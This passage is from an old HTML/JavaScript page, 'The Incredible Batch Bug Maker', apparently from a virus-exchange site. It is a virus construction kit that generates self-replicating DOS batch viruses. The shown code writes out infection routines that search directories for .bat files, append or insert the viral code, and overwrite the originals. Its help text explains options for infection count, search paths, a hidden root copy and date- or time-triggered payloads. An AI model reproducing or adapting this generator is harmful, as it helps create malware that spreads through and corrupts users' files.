        subline=subline+"" %_""+key+""%"";


    else subline=subline+""%_""+key+""%"";


    write(subline);


    fromchar=newln+2;


   }


  }


 } else if (activate) write (""::""+key+"" *** activate code ***"");


 if (activate) write("":na""+key);


 if (type==3) {


  write(""call %""+key+""% ""+key+"" rh"");


  write(""set _""+name+""=>nul.""+key);


  write(""set !""+key+""="");


 }


 write(""set ""+key+""="");


 if ((!usecopy||findhost) && type==2) write(""if exist \\!""+key+"".bat del \\!""+key+"".bat"");


 write(""goto ""+key+""end"");


 if ((!usecopy||findhost) && type==2) {


  write("":""+key+""xt"");


  write(""echo.>\\!""+key+"".bat"");


  write(""\\!""+key+"".bat"");


 }


 if (type==3||type==4) {


  write("":""+key+""rh"");


  write(""set _""+name+""=x%_""+key+""%"");


  write(""%""+key+""% %!""+key+""%"");


 }


 write("":""+key+""vir"");


 if (!dopath) {


  write(""for %%a in (""+mask+"") do call ""+v1+"" ""+key+"" i %%a"");


  write(""exit ""+key);


 } else {


  write(""shift%_""+key+""%"");


  write(""if '%2==' exit %""+key+""%"");


  write(""for %%a in (%2\\*.bat %2*.bat) do call ""+v1+"" ""+key+"" i %%a"");


  write(""goto ""+key+""vir"");


 }


 write("":""+key+""i"");


 write(""find &quot;""+key+""&quot;&lt;%3>nul"");


 var v2=""ERR"";


 if (s_seeks=="""") v2=key+""end"";


 if (type==2 && !usecopy) v2=key+""xt"";


 if (s_seeks!="""") v2=key+""j"";


 write(""if not errorlevel 1 goto ""+v2);


 var v2=""type c:\\_""+key+"".bat"";


 if (!usecopy) var v2=""find &quot;""+key+""&quot;&lt;%""+key+""%"";


 if (type==1) {


  write(""type %3>""+key+""$"");


  if (echoblank) write(""echo.>>""+key+""$"");


  write(v2+"">>""+key+""$"");


 }


 if (type==2) {


  write(v2+"">""+key+""$"");


  write(""type %3>>""+key+""$"");


 }


 if (type==3 || type==4) {


  write(""echo @if '%%_""+name+""%%==' goto _""+name+"">""+key+""$"");


  write(""type %3>>""+key+""$"");


  if (echoblank) write(""echo.>>""+key+""$"");


  write(v2+"">>""+key+""$"");


 } 


 write(""move ""+key+""$ %3>nul"");


 if (s_infects!="""") {


  if (s_infects==""1"") write(""exit ""+key);


  else {


   write(""set ""+key+""#=%""+key+""#%1"");


   write(""if %""+key+""#%==""+s_infects+"" exit"");


  }


 }


 if (s_seeks!="""") {


  write("":""+key+""j"");


  write(""set ""+key+""!=%""+key+""#%1"");


  write(""if %""+key+""!%==""+s_seeks+"" exit"");


 }


 if ((s_infects!=""1"" || s_seeks!="""") && type==2 && usecopy==false)


   write(""goto ""+key+""xt"");


 write("":""+key+""end"");


 if (type==2) write(""::**** HOST ****""); 


}





function Info() {


 WinOpen("""");


 wr(""<h1>The Incredible Batch Bug Maker</h1>""); 


 wr(""Makes DOS 6 compatible replicating batch files<br>"");


 wr(""Produced March 27, 1996<br><br>"");


 wr(""The Key String must be unique, the generated bug will not "");


 wr(""touch any batch containing this string. The Sub String is "");


 wr(""used in compound methods, it should also be unique. Infects "");


 wr(""per run is how many batches will be assimilated with each run "");


 wr(""of a bugged batch, if omitted all available batches are game. "");


 wr(""Max seeks is the maximum number of infected files skipped "");


 wr(""before giving up, if empty or NaN no limit checks are made. "");


 wr(""The Add Code box is for adding batch code that will run when "");


 wr(""all time and date conditions are satisfied, or every time if "");


 wr(""no conditions are entered. The condition strings simply match "");


 wr(""the output from the date and time commands. Three methods of "");  


 wr(""attachment are available: Appending simply tacks on the code, "");


 wr(""Inserting places the bug before the host, and Compound which "");


 wr(""uses a single inserted line then appends the rest. Compound "");


 wr(""Immediate runs the bug first, Compound Delayed runs the bug when "");


 wr(""the host completes. Search specifies the directories and order "");


 wr(""for seeking batch files (watch out for path!). Find Host tells "");


 wr(""it to generate code for seeking out the host batch even if run "");


 wr(""from the path (not available on appenders), Use Copy keeps a "");


 wr(""copy of the bug code in the root of C: (must be checked for "");


 wr(""appenders), Hidden hides the root copy, Echo Blank places an "");


 wr(""empty line between the host and any appended code to prevent "");


 wr(""errors with batches that have no final return. Send to Window "");


 wr(""opens a new browser window for the code to avoid trashing the "");


 wr(""form. To copy code to clipboard uncheck it, good for one shot. "");


 wr(""Resizing or reloading the form resets the data. Enjoy!"");


 wr(""<form>"");


 wr(""<input type='button' value='Close' onclick='close()'>"");


 wr(""</form>"");


}


</SCRIPT>

<META content=""MSHTML 6.00.2800.1400"" name=GENERATOR></HEAD>
<BODY text=#ff0000 vLink=#ff0000 aLink=#ff0000 link=#ff0000 bgColor=#000000 
background="""">
<CENTER>
<H1 align=center><FONT size=+3>Nightmare Joker </FONT></H1>
<H2 align=center><I>present's</I> </H2>
<H1>The Incredible Batch Bug Maker</H1>
<H2 align=center><I>coded by</I> </H2>
<H1 align=center>Wavefunc [Independant] </H1><BR>
<FORM name=vars>Key String: <INPUT maxLength=7 size=7 name=Key> � Comment: 
<INPUT size=30 name=Comment><BR>Sub String: <INPUT maxLength=7 size=7 name=Name> 
� Infects per run: <INPUT maxLength=2 size=2 name=Infects> � Max seeks per run: 
<INPUT maxLength=2 size=2 name=Seeks><BR>Method: <SELECT name=Method> <OPTION 
  selected>Appending<OPTION>Inserting<OPTION>Compound Immediate<OPTION>Compound 
  Delayed</OPTION></SELECT> � Search: <SELECT name=Search> <OPTION 
  selected>Current<OPTION>Current Parent<OPTION>Parent Current<OPTION>Current 
  Parent Path</OPTION></SELECT><BR>Add Code: <TEXTAREA name=AddCode rows=3 cols=45></TEXTAREA><BR>Time Match: <INPUT size=7 
name=TMatch1> <INPUT size=7 name=TMatch2> � Date Match: <INPUT size=7 
name=DMatch1> <INPUT size=7 name=DMatch2><BR><BR><INPUT type=checkbox 
name=FindHost> Find Host Batch � <INPUT type=checkbox name=UseCopy> Use Root 
Copy � <INPUT type=checkbox name=HideCopy> Hide Copy<BR><INPUT type=checkbox 
name=EchoBlank> Add blank line for safety � <INPUT type=checkbox 
name=CodeWindow> Send output to window<BR><BR><INPUT onclick=MakeBug(this.form) type=button value=""Make the Batch Bug""> 
<INPUT onclick=Reset() type=reset value=Reset> <INPUT onclick=Info() type=button value=Info> </FORM><BR><A 
href=""http://vx.netlux.org/dl/vir/index.htm""><FONT size=+3>BACK TO HOMEPAGE 
</FONT></A>
<ADDRESS><BR><BR>Last Updated 03-Jan-97 <A 
href=""mailto:njoker@hotmail.com"">njoker@hotmail.com</A> </ADDRESS></CENTER>g 
</BODY></HTML>"
